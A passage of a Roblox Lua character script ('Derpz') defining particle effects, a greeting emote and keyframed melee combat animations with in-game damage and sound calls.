--Transparency = 0,-- Start Transparency
--Transparency2 = 1, -- End Transparency
--CFrame = v.CFrame, -- Start CFrame
--MoveToPos = nil, -- Move to position. You must add .p at the end of a cframe. Do not use angles
--RotationX = 0, -- Rotation X
--RotationY = 0, -- Rotation Y
--RotationZ = 0, -- Rotation Z
--Material = "Neon", -- Material
--Color = Color3.new(.5,.5,.5), -- Color (NOT BRICKCOLOR)
--SoundID = nil, -- Sound that plays while effect is being done
--SoundPitch = 0, -- Pitch
--SoundVolume = 10, -- Vol
--UseBoomerangMath = false, -- Boomerang Enabled
--Boomerang = 0, -- Makes it come back to start position
--SizeBoomerang = 50 -- Makes it come back to start size
--})

end

DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = 1.5,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = v.CFrame,
EndCFrame = v.CFrame,
Color = Color3.new(1,1,1),
EndColor = Color3.new(1,1,1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(4, 4, 4),
Material = "Neon",
Reflectance = 0,
}
)
soundeffect(138210320,3,v,0.8,0,"a")
v:Destroy()
--CFuncs["Sound"].Create("rbxassetid://138210320", v, 0.8, 3)
wait(1)
--something
wait(8)
--v:Destroy()
dude:Destroy()
end))
end))
end
end
end))
end)
ds()
end
end

--Derpz effect functions
function explode_residue(howmuch,part,color,material,transparency,minimum,maximum,sizemin,sizemax)

--WIP
if game.Workspace.Terrain:FindFirstChild(plr.Name.."'s Residue for "..script.Name) then
game.Workspace.Terrain:FindFirstChild(plr.Name.."'s Residue for "..script.Name):Destroy()
else

end
local folder = Instance.new("Model",game.Workspace.Terrain)
folder.Name = plr.Name.."'s Residue for "..script.Name
for i = 0,howmuch do

local groundres = script.Effects.GroundEffectResidue:Clone()
groundres.Parent = folder
groundres.Anchored = false
groundres.Color = color
groundres.Trail.Color = ColorSequence.new(color,Color3.new(1,1,1))
groundres.Material = material
groundres.Transparency = transparency
groundres.Size = Vector3.new(math.random(sizemin,sizemax),math.random(sizemin,sizemax),math.random(sizemin,sizemax))
groundres.Name = part.Name.." Residue"
if part.CFrame then
groundres.CFrame = part.CFrame
else
groundres.CFrame = part
end
local groundbodyvel = Instance.new("BodyVelocity",groundres)
groundbodyvel.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
groundbodyvel.Velocity = Vector3.new(math.random(minimum,maximum),150,math.random(minimum,maximum))

coroutine.resume(coroutine.create(function()
game:GetService("Debris"):AddItem(groundbodyvel,.2)
wait(6)
if groundres.Transparency < 0 then
groundres.Transparency = 0
else
end
for i = 0,10,0.1 do
swait()
groundres.Transparency = groundres.Transparency + 1/100
end
game:GetService("Debris"):AddItem(groundres,1)


end))
end
end
--Derpz effect functions








function FindNearestHead(Position, Distance, SinglePlayer)
if SinglePlayer then
return (SinglePlayer.Torso.CFrame.p - Position).magnitude < Distance
end
local List = {}
for i, v in pairs(workspace:GetChildren()) do
if v:IsA("Model") then
if v:findFirstChild("Head") then
if v ~= Character then
if (v.Head.Position - Position).magnitude <= Distance then
table.insert(List, v)
end 
end 
end 
end 
end
return List
end

function FaceMouse()
Cam = workspace.CurrentCamera
return {
CFrame.new(char.Torso.Position, Vector3.new(mouse.Hit.p.x, char.Torso.Position.y, mouse.Hit.p.z)),
Vector3.new(mouse.Hit.p.x, mouse.Hit.p.y, mouse.Hit.p.z)
}
end

function FaceMouse2()
Cam = workspace.CurrentCamera
return {
CFrame.new(char.Torso.Position, Vector3.new(mouse.Hit.p.x, mouse.Hit.p.y, mouse.Hit.p.z)),
Vector3.new(mouse.Hit.p.x, mouse.Hit.p.y, mouse.Hit.p.z)
}
end
local storehumanoidWS = 16

--Ability Storage
SwimType = 1
function Hello()
attack = true
hum.WalkSpeed = 0
chatfunc("Hello, I'm Derpz.",13,MAINRUINCOLOR.Color)
for i = 0,20,0.1 do
swait()
local Alpha = .25
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0+0.05*math.cos(sine/10),0)*angles(math.rad(4+-4*math.cos(sine/20)),math.rad(-5),math.rad(6+2*math.cos(sine/10)))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1+-0.05*math.cos(sine/10),0.1+-0.1*math.cos(sine/20))*angles(math.rad(-4+4*math.cos(sine/20)),math.rad(0),math.rad(-6+-2*math.cos(sine/10)))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1.1+-0.05*math.cos(sine/10),0.1+-0.1*math.cos(sine/20))*angles(math.rad(-4+4*math.cos(sine/20)),math.rad(0),math.rad(6+-2*math.cos(sine/10)))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.5,0)*angles(math.rad(0+5*math.cos(sine/10)),math.rad(10+10*math.sin(sine/20)),math.rad(-10+5*math.sin(sine/10)))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.8+0.1*math.cos(sine/10),0)*angles(math.rad(176+5*math.sin(sine/10)),math.rad(25+10*math.cos(sine/20)),math.rad(15+20*math.cos(sine/10)))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*cf(0,0,0)*angles(math.rad(4+4*math.cos(sine/20)),math.rad(-6+2*math.cos(sine/10)),math.rad(-6+2*math.sin(sine/10))),Alpha) 
end
hum.WalkSpeed = storehumanoidWS
attack = false
end
function attackone()
attack = true
hum.WalkSpeed = 0
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .15
Animate(RootJoint,cf(0,0.5,0.6)*angles(math.rad(0),math.rad(-31.4),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.6,-0.2)*angles(math.rad(-6.6),math.rad(14.6),math.rad(-13.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.7,-0.4)*angles(math.rad(-30.5),math.rad(0),math.rad(-5.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,0.1,0.4)*angles(math.rad(55.9),math.rad(-19.5),math.rad(-12.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.5,-0.1)*angles(math.rad(47),math.rad(26),math.rad(-6.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(30)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local bodyvel = Instance.new("BodyVelocity",RootPart)
local pep = 10000000
bodyvel.P = pep
bodyvel.MaxForce = Vector3.new(pep,0,pep)
bodyvel.Velocity = RootPart.CFrame.lookVector*3
--KEYFRAME 2
MagniDamage(tors,4,5,10,0,"Normal")
soundeffect(SoundTable["Melee SFX"][math.random(1,#SoundTable["Melee SFX"])],1,tors,10,0,"e")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(-76.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(7.7),math.rad(60.5),math.rad(-6.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(3.7),math.rad(-32.1),math.rad(8.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-2.2,0.9,0.1)*angles(math.rad(86.4),math.rad(-1.7),math.rad(-80.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.3,0)*angles(math.rad(102.1),math.rad(34.4),math.rad(-30.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 3

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,-0.1,0.2)*angles(math.rad(1.9),math.rad(-76.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(-3.3),math.rad(60.8),math.rad(4.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(5.5),math.rad(-31.8),math.rad(13.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1,0.8,0.6)*angles(math.rad(86.7),math.rad(-2.3),math.rad(-71)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.3,0)*angles(math.rad(101.9),math.rad(36.7),math.rad(-31.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 4
MagniDamage(tors,4,5,10,0,"Normal")
soundeffect(SoundTable["Melee SFX"][math.random(1,#SoundTable["Melee SFX"])],1,tors,10,0,"e")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(-76.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(7.7),math.rad(60.5),math.rad(-6.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(3.7),math.rad(-32.1),math.rad(8.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-2.2,0.8,0.1)*angles(math.rad(86.4),math.rad(-1.7),math.rad(-80.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.2,0)*angles(math.rad(102.1),math.rad(34.4),math.rad(-30.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 5

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,-0.1,0.2)*angles(math.rad(1.9),math.rad(-76.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(-3.3),math.rad(60.8),math.rad(4.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(5.5),math.rad(-31.8),math.rad(13.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.9,0.8,0.7)*angles(math.rad(86.7),math.rad(-2.3),math.rad(-71)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,0)*angles(math.rad(101.5),math.rad(41.7),math.rad(-32.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 6
MagniDamage(tors,4,5,10,0,"Normal")
soundeffect(SoundTable["Melee SFX"][math.random(1,#SoundTable["Melee SFX"])],1,tors,10,0,"e")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(-76.3),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(7.7),math.rad(60.5),math.rad(-6.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(3.7),math.rad(-32.1),math.rad(8.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-2.2,0.6,0.1)*angles(math.rad(86.4),math.rad(-1.7),math.rad(-80.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.3,0)*angles(math.rad(102.1),math.rad(34.4),math.rad(-30.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 7

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .07
Animate(RootJoint,cf(0,-0.1,0.2)*angles(math.rad(1.9),math.rad(-80.5),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(-3.3),math.rad(60.8),math.rad(4.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(5.5),math.rad(-31.8),math.rad(13.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.1,0.6,0.9)*angles(math.rad(86.7),math.rad(-2.3),math.rad(-71)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.7,0.2,0)*angles(math.rad(120.7),math.rad(56.7),math.rad(-47.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
bodyvel.Velocity = RootPart.CFrame.lookVector*7
--KEYFRAME 8
MagniDamage(tors,4,7,15,0,"Normal")
soundeffectecho(SoundTable["Melee SFX"][math.random(1,#SoundTable["Melee SFX"])],1,tors,10,0,"e",5,.01)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .45
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(-76.3),math.rad(8.9))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(33.6),math.rad(56.2),math.rad(-28.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.3,0)*angles(math.rad(3.7),math.rad(-32.1),math.rad(-8.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-2.3,0.9,0.1)*angles(math.rad(88.7),math.rad(-15.3),math.rad(-80.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,-0.1)*angles(math.rad(118.6),math.rad(50.9),math.rad(-42.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
bodyvel:Destroy()
--repeated
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .2
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(-76.3),math.rad(8.9))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,0.3)*angles(math.rad(33.6),math.rad(56.2),math.rad(-28.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.3,0)*angles(math.rad(3.7),math.rad(-32.1),math.rad(-8.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-2.3,0.9,0.1)*angles(math.rad(88.7),math.rad(-15.3),math.rad(-80.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,-0.1)*angles(math.rad(118.6),math.rad(50.9),math.rad(-42.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.8),math.rad(5.4),math.rad(76)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


hum.WalkSpeed = storehumanoidWS
attack = false
end
function attacktwo()
attack = true
hum.WalkSpeed = 0

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .16
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(-56),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1,0.1)*angles(math.rad(7.7),math.rad(60.5),math.rad(-6.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-1,0.1)*angles(math.rad(3.7),math.rad(-32.1),math.rad(6.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.7,0.7)*angles(math.rad(79.8),math.rad(-4.6),math.rad(-27.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.7,0.3,0.6)*angles(math.rad(102.1),math.rad(34.4),math.rad(32)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4),math.rad(0),math.rad(49.2)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 2

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .08
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(64.9),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.1)*angles(math.rad(-7.5),math.rad(14.4),math.rad(-2.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.3,-1,0.4)*angles(math.rad(0),math.rad(-50.8),math.rad(3.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0,0.5)*angles(math.rad(105),math.rad(-16.3),math.rad(-22.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(2.2,0.5,-0.5)*angles(math.rad(85),math.rad(-2.6),math.rad(32.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4),math.rad(0),math.rad(-64)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local bodyvel = Instance.new("BodyVelocity",RootPart)
local pep = 10000000
bodyvel.P = pep
bodyvel.MaxForce = Vector3.new(pep,0,pep)
bodyvel.Velocity = RootPart.CFrame.lookVector*20
--KEYFRAME 3
MagniDamage(tors,4,9,13,0,"Normal")
soundeffect(SoundTable["Melee SFX"][math.random(1,#SoundTable["Melee SFX"])],1,tors,10,0,"e")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .09
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(86.1),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-0.9,-0.1)*angles(math.rad(2.1),math.rad(12.1),math.rad(-15.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-1,0.5)*angles(math.rad(10.6),math.rad(-80.6),math.rad(13.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,-0.4,0.2)*angles(math.rad(79.2),math.rad(-4.4),math.rad(18.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,0.1,-1.6)*angles(math.rad(99.7),math.rad(6),math.rad(-76.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(6),math.rad(0),math.rad(-86.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
bodyvel:Destroy()
--KEYFRAME 4

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .17
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(89),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.1)*angles(math.rad(4),math.rad(11.8),math.rad(-14.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,0.5)*angles(math.rad(70.9),math.rad(-85.6),math.rad(73.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.8,-0.4,-0.3)*angles(math.rad(86.8),math.rad(-8.2),math.rad(37.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,-0.2,-0.9)*angles(math.rad(102.8),math.rad(-9.3),math.rad(-78.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(7),math.rad(0),math.rad(-87.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


--repeat

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .1
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(89),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.1)*angles(math.rad(4),math.rad(11.8),math.rad(-14.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,0.5)*angles(math.rad(70.9),math.rad(-85.6),math.rad(73.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.8,-0.4,-0.3)*angles(math.rad(86.8),math.rad(-8.2),math.rad(37.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,-0.2,-0.9)*angles(math.rad(102.8),math.rad(-9.3),math.rad(-78.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(7),math.rad(0),math.rad(-87.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

hum.WalkSpeed = storehumanoidWS
attack = false
end
function attackthree()
attack = true
hum.WalkSpeed = 0
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(89),math.rad(23.7))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-0.5,0)*angles(math.rad(6),math.rad(10.7),math.rad(-28.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.3,-0.4,0.5)*angles(math.rad(86.1),math.rad(-44.4),math.rad(88.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,-0.2,-0.3)*angles(math.rad(106.7),math.rad(-30.3),math.rad(44.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.8,-0.2,-1)*angles(math.rad(104.3),math.rad(-8.9),math.rad(-78.1)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(14),math.rad(-35),math.rad(-89)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 2
MagniDamage(rleg,5,15,18,0,"Normal")
soundeffect(SoundTable["Melee SFX"][math.random(1,#SoundTable["Melee SFX"])],1,tors,10,0,"e")
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .23
Animate(RootJoint,cf(0,-0.1,0.3)*angles(math.rad(0),math.rad(89),math.rad(30.2))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-0.4,-0.1)*angles(math.rad(6),math.rad(10.7),math.rad(-32.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime+.15,easingstyle,easingdir)
Animate(RH,cf(1.4,-1,0.5)*angles(math.rad(86.9),math.rad(-16.3),math.rad(88.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime+.15,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.1,-0.1)*angles(math.rad(50.1),math.rad(-34.8),math.rad(13.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,0.1,-0.5)*angles(math.rad(73.4),math.rad(10.8),math.rad(-56.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(14),math.rad(-38),math.rad(-89)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 3

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .15
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(11.7),math.rad(67.4),math.rad(12.7))*RootCF,animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.1,-0.1)*angles(math.rad(54.7),math.rad(-35.5),math.rad(15.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,0.1,-0.5)*angles(math.rad(76.2),math.rad(9.7),math.rad(-58.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(14),math.rad(-37),math.rad(-89)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
hum.WalkSpeed = storehumanoidWS
attack = false
end
function attackfour()
attack = true
hum.WalkSpeed = 0
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .2
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(3.2),math.rad(46.7),math.rad(-9.1))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-10.2),math.rad(35),math.rad(-0.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-0.9,-0.3)*angles(math.rad(12.7),math.rad(-39.2),math.rad(17.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.8,-0.9,-0.8)*angles(math.rad(150.1),math.rad(49.4),math.rad(23.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.1,-0.2)*angles(math.rad(89),math.rad(0),math.rad(-19.1)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18.8),math.rad(-2.1),math.rad(-42.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .125
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(4.3),math.rad(44.9),math.rad(-8.8))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1,0.1)*angles(math.rad(-9.7),math.rad(35),math.rad(2.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-0.9,-0.3)*angles(math.rad(8),math.rad(-40.1),math.rad(14))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.1,0.4,-1.3)*angles(math.rad(106),math.rad(20.4),math.rad(50.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1,-0.2,-1.1)*angles(math.rad(70.5),math.rad(6.3),math.rad(-42.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(16.9),math.rad(-3.5),math.rad(-40.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 3

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(5.1),math.rad(43.6),math.rad(-8.7))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1,0.1)*angles(math.rad(-9.3),math.rad(34.9),math.rad(4.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-0.9,-0.3)*angles(math.rad(4.3),math.rad(-40.7),math.rad(11.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.3,-0.5,-0.8)*angles(math.rad(106),math.rad(20.4),math.rad(61.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.4,-0.5,-0.9)*angles(math.rad(76.5),math.rad(0.7),math.rad(-43.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.6),math.rad(-5.7),math.rad(-43.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 4

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In

Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(4.5),math.rad(44.6),math.rad(-8.8))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1,0.1)*angles(math.rad(-9.6),math.rad(34.9),math.rad(2.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-0.9,-0.3)*angles(math.rad(7.2),math.rad(-40.3),math.rad(13.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.5,-0.2,-1)*angles(math.rad(102.5),math.rad(1.1),math.rad(52.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(-0.4,-0.5,-1.7)*angles(math.rad(143),math.rad(-40.7),math.rad(-16.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.9),math.rad(-6.8),math.rad(-44.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 5

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In

